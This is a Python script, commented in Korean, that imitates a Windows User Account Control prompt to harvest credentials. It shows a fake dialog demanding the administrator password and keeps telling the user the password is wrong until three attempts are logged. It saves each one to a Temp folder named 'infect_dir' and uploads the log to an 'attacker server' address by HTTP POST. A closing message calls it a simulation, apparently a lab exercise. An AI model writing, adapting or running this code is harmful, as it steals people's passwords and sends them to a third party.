import os
import subprocess
import time
import sys
import psutil
import tkinter as tk
from tkinter import messagebox, ttk, simpledialog
from PIL import Image, ImageTk
import requests

# 경로 및 로그 설정
LOCAL_BASE_DIR = os.path.expanduser(r"~\AppData\Local\Temp\infect_dir")
os.makedirs(LOCAL_BASE_DIR, exist_ok=True)
LOCAL_LOG_PATH = os.path.join(LOCAL_BASE_DIR, "logs.txt")

# 공격자 서버 주소
HTTP_SERVER = 'http://192.168.56.103:5000/upload'

def clear_logs():
    if os.path.exists(LOCAL_LOG_PATH):
        os.remove(LOCAL_LOG_PATH)

# 로그 업로드 함수
def upload_log_http(filename):
    try:
        with open(filename, 'rb') as f:
            files = {'file': (os.path.basename(filename), f)}
            response = requests.post(HTTP_SERVER, files=files)
        if response.status_code == 200:
            print("[+] 로그 전송 완료 (HTTP)")
        else:
            print(f"[!] 서버 응답 오류: {response.status_code}")
    except Exception as e:
        print(f"[!] 로그 전송 실패 (HTTP): {e}")

# 가짜 UAC 스타일 GUI
class FakeUACPopup:
    def __init__(self):
        self.attempts = 0
        self.max_attempts = 3
        self.show_popup()

    def show_popup(self):
        self.root = tk.Tk()
        self.root.title("User Account Control")
        self.root.geometry("400x200")
        self.root.configure(bg='white')
        self.root.resizable(False, False)

        frame = tk.Frame(self.root, bg='white')
        frame.pack(pady=20)

        title = tk.Label(frame, text="관리자 권한이 필요합니다", font=("Segoe UI", 14, "bold"), bg='white')
        title.pack(pady=(0, 10))

        message = tk.Label(frame, text="시스템 보안 강화를 위해 관리자 암호를 입력하세요.\n이 작업을 완료하지 않으면 서비스 이용이 제한됩니다.",
                           font=("Segoe UI", 10), bg='white', justify='center')
        message.pack(pady=5)

        self.pwd_entry = tk.Entry(frame, show='*', width=30, font=("Segoe UI", 12))
        self.pwd_entry.pack(pady=10)
        self.pwd_entry.focus()

        button = tk.Button(frame, text="확인", command=self.submit_password, font=("Segoe UI", 10))
        button.pack()

        self.root.mainloop()

    def submit_password(self):
        password = self.pwd_entry.get()
        with open(LOCAL_LOG_PATH, 'a', encoding='utf-8') as f:
            f.write(f"Attempt {self.attempts + 1}: {password}\n")

        self.attempts += 1
        if self.attempts < self.max_attempts:
            messagebox.showerror("오류", "암호가 올바르지 않습니다. 다시 시도해 주세요.")
            self.pwd_entry.delete(0, tk.END)
        else:
            messagebox.showinfo("승인 완료", "권한 승인이 완료되었습니다.")
            self.root.destroy()

# 메인 실행
if __name__ == "__main__":
    clear_logs()
    FakeUACPopup()
    upload_log_http(LOCAL_LOG_PATH)
    print("[✓] 시뮬레이션 완료.")
